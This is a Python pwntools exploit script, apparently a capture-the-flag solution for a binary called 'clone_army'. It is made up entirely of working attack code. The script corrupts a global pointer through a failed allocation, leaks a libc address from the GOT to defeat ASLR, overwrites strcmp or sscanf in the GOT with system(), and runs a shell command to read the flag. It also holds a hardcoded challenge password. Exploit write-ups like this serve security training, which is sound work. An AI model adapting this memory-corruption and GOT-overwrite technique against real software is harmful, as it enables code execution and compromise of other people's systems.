#!/usr/bin/env python3
from pwn import *

def int_as_float(i: int) -> float:
	assert isinstance(i, int)
	i_bytes = struct.pack("<I", i)
	return struct.unpack("<f", i_bytes)[0]

def prompt_response(r, bs: bytes):
	data = r.recvuntil(b"\n> ")
	if data is None:
		error("Timed out waiting for prompt")
	
	if not data.endswith(b"\n> "):
		error(f"Expected prompt, got: {data.decode()}")
	
	r.sendline(bs)

def reply(r, q: bytes, a: bytes):
	data = r.recvuntil(q)
	if data is None:
		error(f"Timed out waiting for question: {q.decode()}")
	
	if not data.endswith(q):
		error(f"Expected {repr(q)}, got: {repr(data)}")
	
	prompt_response(r, a)


exe = ELF(".build/clone_army")
context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]
# context.log_level = "debug"
# context.timeout = 1

clone_army = exe.symbols["clone_army"]
sizeof_clone = 16

assert clone_army % sizeof_clone == 0

leaksym = "__libc_start_main"
strcmp = "strcmp"
sscanf = "__isoc99_sscanf"

leaksym_got = exe.got[leaksym]
assert leaksym_got % sizeof_clone == 0

corruptsym = strcmp
corruptsym_got = exe.got[corruptsym]
if corruptsym_got % sizeof_clone != 0x8:
	corruptsym = sscanf
	corruptsym_got = exe.got[corruptsym]
	assert corruptsym_got % sizeof_clone == 0x8


if args.REMOTE:
	libc = ELF("publish/clone_army-libc.so", checksec=False)
	
	host = args.HOST or "localhost"
	port = int(args.PORT or 25001)
	
	info(f"Connecting to {host}:{port}")
	r = remote(host, port)
else:
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
	
	if args.DEBUG:
		info("Running under debugger")
		r = exe.debug(gdbscript="""
			c
		""")
	else:
		info("Running locally")
		r = exe.process()


initial_data = r.recv(10, timeout=1)
if initial_data == b"Password: ":
	info("[0/10] Sending challenge's early-access password")
	r.sendline(b"lets_not_leak_mkay")
else:
	r.unrecv(initial_data)


info("[1/10] Setting up master clone")

reply(r, b"Are you ready to build our clone army?", b"yes")
reply(r, b"Height (feet)?", b"0")

POUNDS_TO_KILOGRAMS = 0.4536
clone_army_count = 42
weight = int_as_float(clone_army_count) / POUNDS_TO_KILOGRAMS
reply(r, b"Weight (pounds)?", repr(weight).encode())

reply(r, b"Accuracy (percent)?", b"0")

num_clones = clone_army // sizeof_clone


info(f"[2/10] Allocating {num_clones} clones, bringing allocation size up to {clone_army:#x} bytes")

reply(r, b"Shall we make some clones?", b"yes")
reply(r, b"How many clones shall be produced, my liege?", str(num_clones).encode())

KiB = 1024
MiB = 1024 * KiB
GiB = 1024 * MiB
massive_count = 12 * GiB // sizeof_clone


info(f"[3/10] Allocating {massive_count} clones, which should fail and set clone_army to NULL")

reply(r, b"Shall we make more clones?", b"yes")
reply(r, b"How many clones shall be produced, my liege?", str(massive_count).encode())

r.recvuntil(b"bringing the army up to ", timeout=5)
total_clones = int(r.recvuntil(b" total clones!\n", drop=True).decode())

if total_clones != clone_army_count:
	error(f"Expected {clone_army_count} clones, got {total_clones}")


info("[4/10] Successfully corrupted clone_army to point to itself")

reply(r, b"Shall we make more clones?", b"no")


info("[5/10] Editing soldier #0's weight, corrupting clone_army_count to be very large")

reply(r, b"Oh glorious one, are there any soldiers you're unsatisfied with?", b"yes")
reply(r, b"Which soldier requires corrective action, my liege?", b"0")
reply(r, b"attributes would you like to change?", b"3") #weight

weight = int_as_float((clone_army + 256) // sizeof_clone) / POUNDS_TO_KILOGRAMS
reply(r, b"New weight (pounds)?", repr(weight).encode())


info("[6/10] Editing soldier #0's ID, cortupting the clone_army pointer back to NULL")

reply(r, b"Are you satisfied with these corrections?", b"no")
reply(r, b"attributes would you like to change?", b"1") #id
reply(r, b"New ID?", b"0")
reply(r, b"Are you satisfied with these corrections?", b"yes")


info(f"[7/10] Editing soldier #{leaksym_got:#x}, which overlaps with {leaksym}@GOT")

reply(r, b"Oh glorious one, are there any soldiers you're unsatisfied with?", b"yes")
reply(r, b"Which soldier requires corrective action, my liege?", str(leaksym_got).encode())

r.recvuntil(b"Which of soldier #")
leaksym_leak = int(r.recvuntil(b"'s attributes", drop=True).decode())

leaksym_addr = libc.symbols[leaksym]
if leaksym_leak & 0x0fff != leaksym_addr & 0x0fff:
	error(f"Lower 12 bits of leaked {leaksym} address does not match that from the provided libc. &{leaksym} = {leaksym_addr:#x}, {leaksym}_leak = {leaksym_leak:#x}")

leaksym_to_system = libc.symbols["system"] - leaksym_addr
leaksym_low32 = leaksym_addr & 0xffffffff

aslr_slide = leaksym_leak - leaksym_low32
libc.address += aslr_slide
leaksym_addr = libc.symbols[leaksym]

# Hopefully a symbol that isn't used again is selected here!
reply(r, b"would you like to change?", b"1") #id
reply(r, b"New ID?", str(0x0badc0de).encode()) #sign bit must be clear
reply(r, b"Are you satisfied with these corrections?", b"yes")


info(f"[8/10] Leaked LO32({leaksym}): {leaksym_addr:#x}, ASLR slide: {aslr_slide:#x}")

system_low32 = libc.symbols["system"] & 0xffffffff
weight = int_as_float(system_low32) / POUNDS_TO_KILOGRAMS


info(f"[9/10] Editing soldier #{corruptsym_got - 0x8:#x}'s weight, corrupting {corruptsym}@GOT to system()")

reply(r, b"Oh glorious one, are there any soldiers you're unsatisfied with?", b"yes")
reply(r, b"Which soldier requires corrective action, my liege?", str(corruptsym_got - 0x8).encode())
reply(r, b"would you like to change?", b"3") #weight
reply(r, b"New weight (pounds)?", repr(weight).encode())


info("[10/10] WOOOHOOOO! system(\"cat flag.txt\")")

shellcmd = b"cat flag.txt"
if corruptsym == strcmp:
	reply(r, b"Are you satisfied with these corrections?", shellcmd)
else:
	reply(r, b"Are you satisfied with these corrections?", b"no")
	reply(r, b"attributes would you like to change?", shellcmd)

print(r.recvline(keepends=False).decode())
